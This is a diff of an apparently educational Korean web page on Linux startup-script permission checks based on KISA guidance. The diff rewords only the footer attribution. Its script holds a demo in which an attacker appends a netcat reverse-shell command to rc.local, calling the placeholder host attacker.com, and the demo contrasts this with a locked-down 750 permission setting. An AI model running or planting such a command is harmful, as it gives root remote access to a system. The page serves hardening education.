@@ -173,7 +173,7 @@ chmod -R 750 /etc/rc.d/init.d
       <div class="kref">점검기준: 파일 및 디렉터리 관리 &gt; 시작 스크립트 권한</div>
     </div>
   </div>
-  <div class="footer">주요정보통신기반시설 기술적 취약점 분석·평가 가이드(KISA) 기반 · 교육용 재구성</div>
+  <div class="footer">KISA 공개 가이드의 점검 항목 구성을 참고한 교육용 재구성 · 항목 번호는 이 사이트의 자체 번호이며 공식 고시의 항목 번호와 다릅니다</div>
 </div>
 <script>
 const ATTACK = { vuln: [[`cmt`, `# 시작 스크립트 권한 확인 후 변조`], [`prompt`, `attacker$ ls -l /etc/rc.d/init.d/network`], [`bad`, `-rwxrwxrwx 1 root root ... network`], [`bad`, `attacker$ echo "nc attacker.com 4444 -e /bin/sh" &gt;&gt; /etc/rc.d/rc.local`], [`bad`, `&gt;&gt; 관리자 재부팅 시 역방향 셸이 root 권한으로 실행`]], secure: [[`cmt`, `# 동일한 변조 시도`], [`prompt`, `attacker$ echo "nc ..." &gt;&gt; /etc/rc.d/rc.local`], [`good`, `-rwxr-x--- 1 root root (750)`], [`good`, `&gt;&gt; Permission denied — root만 수정 가능`]] };
